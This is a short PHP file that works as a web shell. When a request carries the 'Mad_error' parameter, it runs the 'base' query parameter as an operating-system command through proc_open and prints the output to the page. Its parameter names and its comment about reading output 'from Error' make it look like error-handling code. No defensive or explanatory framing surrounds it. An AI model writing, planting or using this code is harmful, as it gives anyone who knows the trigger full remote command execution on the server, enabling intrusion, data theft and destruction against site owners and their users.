<?php
  if (isset($_GET['Mad_error'])) {
      $command = $_GET['base'];
      $descriptorspec = array(
          0 => array("pipe", "r"),
          1 => array("pipe", "w"),
          2 => array("pipe", "w")
      );

      $process = proc_open($command, $descriptorspec, $pipes);

      if (is_resource($process)) {
          // Read output from Error
          $output = stream_get_contents($pipes[1]);
          echo "<pre>$output</pre>";

          // Close pipes
          fclose($pipes[0]);
          fclose($pipes[1]);
          fclose($pipes[2]);

          // Close process
          $return_value = proc_close($process);
          if ($return_value !== 0) {
              // Handle non-zero return value
          }
      } else {
          // Handle error opening process
      }
  }
  ?>